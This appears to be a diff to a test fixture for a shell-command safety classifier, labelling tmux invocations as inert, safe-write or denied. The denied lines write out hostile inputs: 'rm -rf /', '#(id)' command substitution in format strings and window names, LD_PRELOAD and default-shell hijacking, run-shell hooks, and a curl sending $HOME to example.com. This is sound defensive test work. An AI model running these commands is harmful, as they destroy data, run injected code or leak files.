@@ -3020,6 +3020,7 @@ tmux --help	inert
 tmux --version	inert
 tmux -L test ls	inert
 tmux -S /tmp/sock ls	inert
+tmux -f /tmp/x.conf new-session -d	denied
 tmux a	safe-write
 tmux attach	safe-write
 tmux attach-session	safe-write
@@ -3028,6 +3029,8 @@ tmux confirm-before 'rm -rf /'	denied
 tmux detach-client	safe-write
 tmux display	inert
 tmux display-message	inert
+tmux display-message -p '#(rm -rf /)'	denied
+tmux display-message -p '#{session_name}'	inert
 tmux has	inert
 tmux has-session	inert
 tmux if-shell 'true' 'ls'	inert
@@ -3055,6 +3058,7 @@ tmux new -d 'curl -s https://example.com/$HOME'	denied
 tmux new-session	safe-write
 tmux new-session 'rm -rf /'	denied
 tmux new-session -Q 'ls'	denied
+tmux new-session -d -P -F '#(id)'	denied
 tmux new-session -d -s work	safe-write
 tmux new-session -d -s work 'git status'	safe-write
 tmux new-session -d -s work rm -rf /	denied
@@ -3069,6 +3073,7 @@ tmux pipe-pane -o /tmp/log 'cat'	inert
 tmux pipe-pane -o /tmp/log 'rm -rf /'	denied
 tmux rename-session	safe-write
 tmux rename-window	safe-write
+tmux rename-window '#(id)'	denied
 tmux resize-pane	safe-write
 tmux resize-window	safe-write
 tmux respawn-pane	safe-write
@@ -3085,8 +3090,16 @@ tmux select-pane	safe-write
 tmux select-window	safe-write
 tmux send	safe-write
 tmux send-keys	safe-write
+tmux set -g default-shell /tmp/x	denied
+tmux set -g mouse on	safe-write
+tmux set -g status-right '#(id)'	denied
+tmux set -s command-alias[100] x=run-shell	denied
 tmux set-environment	safe-write
+tmux set-environment -g LD_PRELOAD /tmp/x.so	denied
 tmux set-option	safe-write
+tmux set-option -g after-new-window 'run-shell id'	denied
+tmux set-option -g default-command 'rm -rf /'	denied
+tmux setenv -g EDITOR_THEME dark	safe-write
 tmux show	inert
 tmux show-environment	inert
 tmux show-options	inert
